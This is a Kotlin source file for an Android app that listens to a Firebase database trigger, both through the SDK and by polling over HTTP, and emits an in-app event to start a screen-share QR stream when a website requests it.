package com.example.data.firebase

import android.content.Context
import android.util.Log
import com.example.data.model.PathChannel
import com.example.data.model.WebsitePlatform
import com.example.util.AppPreferences
import com.example.util.ScreenShareManager
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.ValueEventListener
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.SharedFlow
import kotlinx.coroutines.flow.asSharedFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

/**
 * Lightweight Unified Database Trigger Listener (`<rootNode>/trigger`)
 *
 * Emits a screen-share launch event when the website's QR button requests a live QR stream.
 * Reuses the single `FirebaseScreenStreamManager` Firebase instance with zero AccessibilityService overhead.
 */
object DatabaseTriggerListener {

    private const val TAG = "DatabaseTriggerListener"
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var isListening = false

    @Volatile
    private var sdkConnected = false

    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(4, TimeUnit.SECONDS)
        .readTimeout(4, TimeUnit.SECONDS)
        .build()

    private val _getStartedTriggerEvents = MutableSharedFlow<Long>(extraBufferCapacity = 5)
    val getStartedTriggerEvents: SharedFlow<Long> = _getStartedTriggerEvents.asSharedFlow()

    private var lastHandledTime = 0L

    private var activeSdkRef: DatabaseReference? = null
    private var activeSdkListener: ValueEventListener? = null
    private var activeListeningSlot: Int = -1

    fun startListening(context: Context) {
        val appContext = context.applicationContext
        val prefs = AppPreferences.getInstance(appContext)
        val channel = prefs.getCurrentChannel()

        if (activeListeningSlot != channel.slotNumber) {
            activeListeningSlot = channel.slotNumber
            setupFirebaseSdkListener(appContext, channel)
        }

        if (isListening) return
        isListening = true

        setupHttpPollingFallback(appContext)
    }

    private fun setupFirebaseSdkListener(context: Context, channel: PathChannel) {
        try {
            activeSdkListener?.let { activeSdkRef?.removeEventListener(it) }

            val db = FirebaseScreenStreamManager.getInstance(context).firebaseDatabase ?: return
            val triggerRef = db.getReference(channel.triggerPath)
            val listener = object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    sdkConnected = true
                    if (!AppPreferences.getInstance(context).isChannelLoggedIn) return
                    processSnapshot(snapshot, triggerRef, context)
                }

                override fun onCancelled(error: DatabaseError) {
                    sdkConnected = false
                }
            }
            activeSdkRef = triggerRef
            activeSdkListener = listener
            triggerRef.addValueEventListener(listener)
        } catch (e: Exception) {
            sdkConnected = false
            Log.w(TAG, "Error setting up Firebase SDK trigger listener: ${e.message}")
        }
    }

    private fun processSnapshot(
        snapshot: DataSnapshot,
        ref: DatabaseReference,
        context: Context
    ) {
        try {
            val action = snapshot.child("action").getValue(String::class.java)
                ?: snapshot.child("command").getValue(String::class.java)
                ?: snapshot.child("trigger").getValue(String::class.java)
                ?: snapshot.getValue(String::class.java)

            if (isGetStartedAction(action)) {
                val rawPlatform = snapshot.child("platform").getValue(String::class.java)
                ref.child("action").setValue("handled")
                ref.child("handled_at").setValue(System.currentTimeMillis())
                if (!rawPlatform.isNullOrBlank()) {
                    ScreenShareManager.selectWebsitePlatform(
                        WebsitePlatform.fromId(rawPlatform),
                        context,
                        announce = false
                    )
                }
                executeGetStartedWorkflow()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error processing snapshot: ${e.message}", e)
        }
    }

    private fun setupHttpPollingFallback(context: Context) {
        scope.launch {
            val prefs = AppPreferences.getInstance(context)
            while (isActive) {
                if (prefs.isChannelLoggedIn) {
                    val currentChannel = prefs.getCurrentChannel()
                    if (activeListeningSlot != currentChannel.slotNumber) {
                        activeListeningSlot = currentChannel.slotNumber
                        setupFirebaseSdkListener(context, currentChannel)
                    }
                    if (!sdkConnected) {
                        pollUnifiedTriggerUrl(
                            url = "https://my-sc-tools-default-rtdb.firebaseio.com/${currentChannel.triggerPath}.json",
                            context = context
                        )
                    }
                }
                delay(4000L)
            }
        }
    }

    private fun pollUnifiedTriggerUrl(url: String, context: Context) {
        try {
            val req = Request.Builder().url(url).get().build()
            httpClient.newCall(req).execute().use { resp ->
                if (resp.isSuccessful) {
                    val body = resp.body?.string()?.trim().orEmpty()
                    if (body.isNotBlank() && body != "null") {
                        val parsedPlatform = extractPlatformIfGetStarted(body)
                        if (parsedPlatform != null) {
                            acknowledgeViaHttp(url)
                            if (parsedPlatform.isNotBlank()) {
                                ScreenShareManager.selectWebsitePlatform(
                                    WebsitePlatform.fromId(parsedPlatform),
                                    context,
                                    announce = false
                                )
                            }
                            executeGetStartedWorkflow()
                        }
                    }
                }
            }
        } catch (_: Exception) {}
    }

    private fun extractPlatformIfGetStarted(payload: String): String? {
        if (payload.equals("\"get_started\"", ignoreCase = true)) return ""
        if (payload.startsWith("{")) {
            try {
                val json = JSONObject(payload)
                val action = json.optString("action", json.optString("command", json.optString("trigger", "")))
                if (isGetStartedAction(action)) {
                    return json.optString("platform", "")
                }
            } catch (_: Exception) {}
        }
        return null
    }

    private fun isGetStartedAction(action: String?): Boolean {
        if (action.isNullOrBlank()) return false
        val clean = action.trim().lowercase()
        return clean == "get_started" || clean == "getstarted" || clean == "start" || clean == "click_get_started"
    }

    private fun acknowledgeViaHttp(url: String) {
        scope.launch {
            try {
                val patchJson = JSONObject().apply {
                    put("action", "handled")
                    put("handled_at", System.currentTimeMillis())
                }.toString()
                val body = patchJson.toRequestBody("application/json".toMediaType())
                val patchReq = Request.Builder().url(url).patch(body).build()
                httpClient.newCall(patchReq).execute().close()
            } catch (_: Exception) {}
        }
    }

    fun executeGetStartedWorkflow() {
        val now = System.currentTimeMillis()
        if (now - lastHandledTime < 3000L) {
            return
        }
        lastHandledTime = now
        _getStartedTriggerEvents.tryEmit(now)
    }
}
